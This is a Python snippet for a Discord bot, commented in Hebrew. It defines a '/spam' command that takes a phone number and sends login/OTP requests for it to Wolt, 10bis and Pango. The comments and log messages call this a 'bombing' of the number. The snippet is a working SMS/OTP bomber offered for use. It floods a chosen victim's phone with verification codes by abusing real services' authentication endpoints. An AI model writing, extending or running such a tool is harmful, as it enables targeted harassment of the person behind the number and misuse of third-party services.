# פונקציית ההפצצה המעודכנת עם לוגים ל-Render
async def send_israeli_spam(phone):
    apis = [
        {"name": "Wolt", "url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{phone[1:]}"}},
        {"name": "10bis", "url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone}},
        {"name": "Pango", "url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}}
    ]
    
    async with httpx.AsyncClient(timeout=10.0) as client:
        for api in apis:
            try:
                response = await client.post(api["url"], json=api["json"])
                # השורה הזו תדפיס ללוח של Render אם זה הצליח או לא
                print(f"[LOG] נשלחה בקשה ל-{api['name']} | סטטוס: {response.status_code}")
            except Exception as e:
                print(f"[ERROR] שגיאה בשליחה ל-{api['name']}: {str(e)}")

# בתוך פקודת ה-spam
@bot.tree.command(name="spam")
async def spam(interaction: discord.Interaction, phone: str):
    await interaction.response.defer(ephemeral=True)
    print(f"--- מתחיל הפצצה על המספר: {phone} ---")
    await send_israeli_spam(phone)
    print(f"--- הסתיימה ההפצצה על: {phone} ---")
    await interaction.followup.send(f"✅ ההפצצה הסתיימה!")
